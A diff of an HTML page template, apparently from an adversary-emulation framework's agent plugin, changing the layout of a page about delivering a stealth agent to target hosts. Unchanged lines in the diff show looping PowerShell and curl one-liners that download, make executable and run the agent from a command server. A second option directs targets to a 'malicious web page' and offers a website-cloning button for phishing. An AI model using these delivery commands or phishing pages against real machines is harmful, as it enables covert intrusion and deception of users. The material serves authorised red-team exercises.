@@ -30,28 +30,27 @@
                             <p style="width: 75%;font-size:14px;">
                                 A sandcat is a desert cat that leaves no footprint. In that vein,
                                 54ndc47 is an agent designed to run without detection on any host operating system.
-                                It intentionally blends into the environment and executes CALDERA operations.
+                                It intentionally blends into the environment and executes operations.
                             </p>
                             <b><p style="font-size:14px;color:gold">&#9888; Use an initial access option below to deliver the agent to target hosts.</p></b>
                         </div>
                     </div>
                 </div>
 
-                <!-- Access #1 -->
+                <!-- Access -->
 
                 <div class="section-profile">
                     <div class="row">
-                        <div class="column section-border" style="flex:25%">
-                            <img src="/sandcat/img/access.png">
-                            <h4>Initial Access #1</h4>
-                            <p class="section-description">
+                        <div class="column section-border" style="flex:50%">
+                            <h4>Option #1</h4>
+                            <p class="paragraph">
                                 Copy and paste one of the delivery commands into a terminal window to start a copy of the CAT.
                             </p>
-                            <button class="button-success cat-btn" onclick="show('delivery-windows')">Windows</button>
-                            <button class="button-success cat-btn" onclick="show('delivery-linux')">Linux</button>
-                            <button class="button-success cat-btn" onclick="show('delivery-darwin')">MacOS</button>
-                        </div>
-                        <div class="column" style="flex:75%">
+                            <div class="wrapper">
+                                <button id="cat1" class="button-success cat-btn" style="width:20%" onclick="show('delivery-windows')">Windows</button>
+                                <button id="cat2" class="button-success cat-btn" style="width:20%" onclick="show('delivery-linux')">Linux</button>
+                                <button id="cat3" class="button-success cat-btn" style="width:20%" onclick="show('delivery-darwin')">MacOS</button>
+                            </div>
                             <code id="delivery-windows" class="delivery" style="display: none">
                                 <pre>while($true){$url="http://localhost:8888/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output); C:\Users\Public\sandcat.exe -server http://localhost:8888 -group my_group; sleep 60}</pre>
                             </code>
@@ -62,25 +61,16 @@
                                 <pre>while true; do curl -sk -X POST -H 'file:sandcat.go' -H 'platform:darwin' http://localhost:8888/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server http://localhost:8888 -group my_group; sleep 60; done</pre>
                             </code>
                         </div>
-                    </div>
-                </div>
-
-                <!-- Access #2 -->
-
-                <div id="clone" class="section-profile">
-                    <div class="row">
-                        <div class="column section-border" style="flex:25%">
-                            <img src="/sandcat/img/access.png">
-                            <h4>Initial Access #2</h4>
-                            <p class="section-description">
+                        <div class="column malicious-link" style="flex:50%">
+                            <h4>Option #2</h4>
+                            <p class="paragraph">
                                 Have each targeted machine navigate to our malicious web page. Then start the downloaded
                                 54ndc47 agent. Use our sample malicious web page or overwrite it using the website
                                 cloning button below.
                             </p>
                             <input id="cloneNew" placeholder="Enter a url"/>
-                            <button type="button" class="button-success" onclick="cloneWebsite()">Clone</button>
-                        </div>
-                        <div class="column malicious-link" style="flex:75%">
+                            <button type="button" class="button-success cat-btn" onclick="cloneWebsite()">Clone</button>
+                            <br>
                             <a href="/plugin/sandcat/malicious" target="_blank">
                                 <img src="/sandcat/img/arrow.png"/>
                             </a>
